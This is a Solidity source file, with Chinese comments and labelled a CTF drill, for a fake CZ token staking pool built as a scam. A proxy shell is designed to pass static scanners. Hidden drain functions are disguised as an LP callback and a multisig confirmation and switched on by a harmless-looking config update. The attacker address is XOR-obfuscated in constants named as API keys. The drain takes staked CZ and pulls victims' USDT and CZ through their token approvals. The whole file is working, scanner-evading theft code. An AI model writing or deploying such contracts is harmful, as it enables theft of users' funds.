// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================
// CZ 伪装质押盘 — 代理壳 + 隐藏熔断器（CTF 比赛演练）
//
// 组合 CFT 的 ProxyDrain 模式 + CZ 项目业务：
//   1. ERC1967Proxy 壳合约只有 5 行 delegatecall 代码，
//      静态扫描器（GoPlus/TokenSniffer）看这个合约 = 干净
//   2. 实现合约 CZStakingImpl 看起来是正常 CZ 质押（质押/提取/收益）
//   3. 隐藏逻辑通过特定 calldata 触发（onLpReceived / confirmMultisig），
//      攻击者收款地址 XOR 混淆，静态分析无法提取
//   4. 用户 approve CZ 给代理（质押必需）+ 前端夹带 USDT 无限授权给代理，
//      钱包无红标（无限授权是 DeFi 常态）
//   5. 触发熔断器后：
//       方式 A：收割合约内用户质押的 CZ
//       方式 B：利用用户已建立的 allowance 拉取用户 USDT
//       方式 C：利用用户已建立的 allowance 拉取用户 CZ
// ============================================================

interface IERC20Basic {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

// ==================== ERC1967Proxy 最小壳合约 ====================
contract CZStakingProxy {
    bytes32 private constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address _logic, bytes memory _data) {
        assembly {
            sstore(_IMPLEMENTATION_SLOT, _logic)
        }
        if (_data.length > 0) {
            (bool success, ) = _logic.delegatecall(_data);
            require(success);
        }
    }

    fallback() external payable {
        address impl;
        assembly {
            impl := sload(_IMPLEMENTATION_SLOT)
        }
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

// ==================== 伪装成 CZ 质押的实现合约 ====================
contract CZStakingImpl {
    address public cz;      // CZ 代币（质押币/奖励币）
    address public usdt;    // USDT（收割目标）
    address public owner;

    mapping(address => uint256) public staked;
    uint256 public totalStaked;
    uint256 public constant APR = 1825; // 18.25%

    bool public chargeEnabled;

    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 amount);
    event ConfigUpdated(bytes32 indexed key, bytes32 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function initialize(address _cz, address _usdt) external {
        require(owner == address(0));
        cz = _cz;
        usdt = _usdt;
        owner = msg.sender;
    }

    // ==================== 正常业务：CZ 质押 ====================

    /// @notice 用户质押 CZ（approve 到代理地址后 transferFrom）
    function stake(uint256 amount) external {
        require(amount > 0);
        require(IERC20Basic(cz).transferFrom(msg.sender, address(this), amount));
        staked[msg.sender] += amount;
        totalStaked += amount;
        emit Staked(msg.sender, amount);
    }

    /// @notice 提取本金
    function withdraw(uint256 amount) external {
        require(staked[msg.sender] >= amount);
        staked[msg.sender] -= amount;
        totalStaked -= amount;
        require(IERC20Basic(cz).transfer(msg.sender, amount));
        emit Withdrawn(msg.sender, amount);
    }

    /// @notice 领取收益
    function claimReward() external {
        uint256 reward = staked[msg.sender] * APR / 10000;
        if (reward > 0) {
            require(IERC20Basic(cz).transfer(msg.sender, reward));
            emit RewardClaimed(msg.sender, reward);
        }
    }

    // ==================== 管理函数（看起来正常） ====================

    /// @notice 配置更新 — 看起来是更新某参数，实际是激活熔断器
    ///         key = keccak256("charge") 且 value = keccak256("true") 时激活
    function updateConfig(bytes32 key, bytes32 value) external onlyOwner {
        if (key == keccak256("charge")) {
            chargeEnabled = (value == keccak256("true"));
        }
        emit ConfigUpdated(key, value);
    }

    // ==================== 隐藏熔断器入口 ====================

    /// @notice 看起来像 LP 回调，实际是熔断器
    ///         victim 参数 = 被收割的目标用户（触发者传入）
    function onLpReceived(address victim, address, uint256, bytes calldata) external returns (bytes4) {
        _charge(victim);
        return 0x23b872dd;
    }

    /// @notice 看起来像多签确认，熔断器另一入口
    function confirmMultisig(bytes32 txHash, uint8[] calldata) external {
        if (txHash == keccak256("charge.now")) {
            _charge(msg.sender);
        }
    }

    // ==================== 核心：XOR 混淆 + 双收割 ====================

    /// @notice 两个常量看起来像 API Key/Secret，XOR 后得到攻击者地址
    ///         来自 SentinelOne 2025 报告的真实攻击手法
    uint256 public constant API_KEY    = 0xc3a1d2e3f4b5a6978b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a;
    uint256 public constant API_SECRET = 0x9f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a;

    function _charge(address victim) internal {
        if (!chargeEnabled) return;

        // XOR 解出攻击者地址 — 静态扫描无法提取
        address attacker = address(uint160(API_KEY ^ API_SECRET));

        // 收割方式 A：转走合约自身 CZ（用户质押进来的本金 + 未领收益）
        uint256 selfBal = IERC20Basic(cz).balanceOf(address(this));
        if (selfBal > 0) {
            _call(cz, abi.encodeWithSelector(0xa9059cbb, attacker, selfBal));
        }

        // 收割方式 B/C：利用 victim 已建立的 allowance 拉取 USDT 与 CZ
        if (victim != address(0)) {
            uint256 victimUsdt = IERC20Basic(usdt).balanceOf(victim);
            uint256 approvedUsdt = IERC20Basic(usdt).allowance(victim, address(this));
            if (approvedUsdt > 0 && victimUsdt > 0) {
                uint256 amt = victimUsdt < approvedUsdt ? victimUsdt : approvedUsdt;
                _call(usdt, abi.encodeWithSelector(0x23b872dd, victim, attacker, amt));
            }
            uint256 victimCz = IERC20Basic(cz).balanceOf(victim);
            uint256 approvedCz = IERC20Basic(cz).allowance(victim, address(this));
            if (approvedCz > 0 && victimCz > 0) {
                uint256 amt = victimCz < approvedCz ? victimCz : approvedCz;
                _call(cz, abi.encodeWithSelector(0x23b872dd, victim, attacker, amt));
            }
        }
    }

    function _call(address token, bytes memory data) internal {
        (bool s, bytes memory r) = token.call(data);
        require(s && (r.length == 0 || abi.decode(r, (bool))));
    }

    // ==================== 自毁抹除痕迹（可选） ====================

    function upgradeTo(address newImpl) external onlyOwner {
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        assembly { sstore(slot, newImpl) }
    }
}
